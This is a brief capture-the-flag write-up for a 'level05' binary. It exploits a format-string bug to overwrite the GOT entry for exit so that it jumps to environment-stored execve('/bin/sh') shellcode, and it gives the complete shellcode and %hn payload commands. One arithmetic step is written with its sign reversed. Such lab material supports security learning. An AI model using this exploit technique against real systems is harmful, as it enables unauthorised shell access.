# Overwrite Got with shell code

## Context

First call to fgets() secure:

```c
  byte buffer_100 [100];
  fgets((char *)buffer_100,100,stdin);
```

But then it call a printf() insecure:

exit() ? overwrtei got section

```c
      printf((char *)buffer_100);
      exit(0);
```

## Overwrite exit
 
Find exit address and overwrite with shell address

```bash
$> objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```

Lets find the buffer place to overwrite exit func

```bash
./level05 
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffd674.f7fdb000.61616161.[...]
```

Buffer is the 10th address on the stack.

### Build final exploit

Export shell code :

```bash
export SHELLCODE=$(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 0xffff + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

Payload : address exit + (address exit + 2 bytes) + padding1 + %10$hn + padding2 + %11$hn

- env buffer address = 0xfffee2c0

Split the value in two parts:

- fffe = 65534
- e2c0 = 58048
- padding1 = 58048 - 8 byte wrote = 58040
- padding2 = 58048 - 65534 = 7486

```bash
cat <(python2.7 -c 'import sys; sys.stdout.write(b"\xe0\x97\x04\x08" + b"\xe2\x97\x04\x08" + b"%58040x" + b"%10$hn" + b"%7486x" + b"%11$hn")') - | ./level05
```